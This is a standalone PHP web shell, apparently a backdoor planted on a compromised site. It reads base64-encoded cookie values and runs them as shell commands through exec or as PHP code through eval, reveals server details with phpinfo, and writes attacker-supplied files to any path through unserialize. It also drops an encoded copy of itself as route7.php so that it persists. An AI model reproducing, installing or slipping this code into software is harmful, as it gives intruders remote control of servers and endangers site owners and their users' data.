<?php
	echo '$#'.'@&'.chr(10).chr(10);

	if(!is_file('route7.php')) {
		file_put_contents('route7.php',base64_decode('PD9waHANCgllY2hvICckIycuJ0AmJy5jaHIoMTApLmNocigxMCk7DQoNCglpZihpc3NldCgkX0NPT0tJRVsnNzYwMjc0MDUnXSkgJiYgIWVtcHR5KCRfQ09PS0lFWyc3NjAyNzQwNSddKSkgew0KCQllY2hvIGh0bWxlbnRpdGllcygoc3RyaW5nKSBiYXNlNjRfZGVjb2RlKCRfQ09PS0lFWyc3NjAyNzQwNSddKSxFTlRfUVVPVEVTKTsNCgkJZWNobyAnPHByZT4nOw0KCQkkb3V0YnVmPScnOyRvdXRzdHI9Jyc7ZXhlYyhiYXNlNjRfZGVjb2RlKCRfQ09PS0lFWyc3NjAyNzQwNSddKSwkb3V0YnVmKTtmb3JlYWNoKCRvdXRidWYgYXMgJHZhbCkgJG91dHN0ci49JHZhbC5jaHIoMTMpLmNocigxMCk7ZWNobyBodG1sZW50aXRpZXMoJG91dHN0cik7DQoJfSBlbHNlaWYoaXNzZXQoJF9DT09LSUVbJzI2MzEyNTk1J10pICYmICFlbXB0eSgkX0NPT0tJRVsnMjYzMTI1OTUnXSkpIHsNCgkJZWNobyBodG1sZW50aXRpZXMoKHN0cmluZykgYmFzZTY0X2RlY29kZSgkX0NPT0tJRVsnMjYzMTI1OTUnXSksRU5UX1FVT1RFUyk7DQoJCWVjaG8gJzxwcmU+JzsgDQoJCWV2YWwoKHN0cmluZykgYmFzZTY0X2RlY29kZSgkX0NPT0tJRVsnMjYzMTI1OTUnXSkpOw0KCX0gZWxzZWlmKGlzc2V0KCRfQ09PS0lFWycxMzAzNzA4NSddKSkgew0KCQlwaHBpbmZvKCk7DQoJfSBlbHNlaWYoaXNzZXQoJF9DT09LSUVbJzYwMzM4MTQ0J10pICYmICFlbXB0eSgkX0NPT0tJRVsnNjAzMzgxNDQnXSkpIHsNCgkJJGFyOD11bnNlcmlhbGl6ZShiYXNlNjRfZGVjb2RlKCRfQ09PS0lFWyc2MDMzODE0NCddKSk7DQoJCSRhcjhbJ3BoJ109aXNzZXQoJGFyOFsncGgnXSk/JGFyOFsncGgnXTonJzsNCgkJJGFyOFsnZm4nXT1pc3NldCgkYXI4WydmbiddKT8kYXI4WydmbiddOidyb3V0ZTMucGhwJzsNCgkJZmlsZV9wdXRfY29udGVudHMoJGFyOFsncGgnXS4kYXI4WydmbiddLGJhc2U2NF9kZWNvZGUoJGFyOFsnY24nXSkpOw0KCX0NCg0KPz4='));
	}

	if(isset($_COOKIE['76027405']) && !empty($_COOKIE['76027405'])) {
		echo htmlentities((string) base64_decode($_COOKIE['76027405']),ENT_QUOTES);
		echo '<pre>';
		$outbuf='';$outstr='';exec(base64_decode($_COOKIE['76027405']),$outbuf);foreach($outbuf as $val) $outstr.=$val.chr(13).chr(10);echo htmlentities($outstr);
	} elseif(isset($_COOKIE['26312595']) && !empty($_COOKIE['26312595'])) {
		echo htmlentities((string) base64_decode($_COOKIE['26312595']),ENT_QUOTES);
		echo '<pre>'; 
		eval((string) base64_decode($_COOKIE['26312595']));
	} elseif(isset($_COOKIE['13037085'])) {
		phpinfo();
	} elseif(isset($_COOKIE['60338144']) && !empty($_COOKIE['60338144'])) {
		$ar8=unserialize(base64_decode($_COOKIE['60338144']));
		$ar8['ph']=isset($ar8['ph'])?$ar8['ph']:'';
		$ar8['fn']=isset($ar8['fn'])?$ar8['fn']:'route3.php';
		file_put_contents($ar8['ph'].$ar8['fn'],base64_decode($ar8['cn']));
	}

?>